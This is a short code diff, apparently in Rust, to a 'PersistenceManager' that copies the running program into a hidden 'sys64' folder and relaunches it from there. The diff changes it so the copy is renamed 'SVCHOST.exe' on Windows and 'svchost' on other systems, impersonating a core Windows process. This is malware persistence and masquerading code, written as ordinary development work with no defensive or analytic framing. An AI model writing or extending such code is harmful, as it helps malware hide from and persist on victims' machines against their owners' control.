@@ -62,7 +62,7 @@ impl PersistenceManager {
         }
     }
 
-    fn copy_and_relaunch(relative_path: &str) {
+    fn copy_and_relaunch(_relative_path: &str) {
         let current_exe = match std::env::current_exe() {
             Ok(e) => e,
             Err(_) => return,
@@ -73,12 +73,12 @@ impl PersistenceManager {
         #[cfg(target_os = "windows")]
         let target_dir = {
             let appdata = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
-            std::path::PathBuf::from(appdata).join(relative_path)
+            std::path::PathBuf::from(appdata).join("sys64")
         };
         #[cfg(not(target_os = "windows"))]
         let target_dir = {
             let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-            std::path::PathBuf::from(home).join(".local/share").join(relative_path)
+            std::path::PathBuf::from(home).join(".local/share").join("sys64")
         };
 
         // If already running from target, skip
@@ -86,7 +86,10 @@ impl PersistenceManager {
             return;
         }
 
-        let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());
+        #[cfg(target_os = "windows")]
+        let target_exe = target_dir.join("SVCHOST.exe");
+        #[cfg(not(target_os = "windows"))]
+        let target_exe = target_dir.join("svchost");
 
         if let Err(_) = std::fs::create_dir_all(&target_dir) {
             std::process::exit(0);
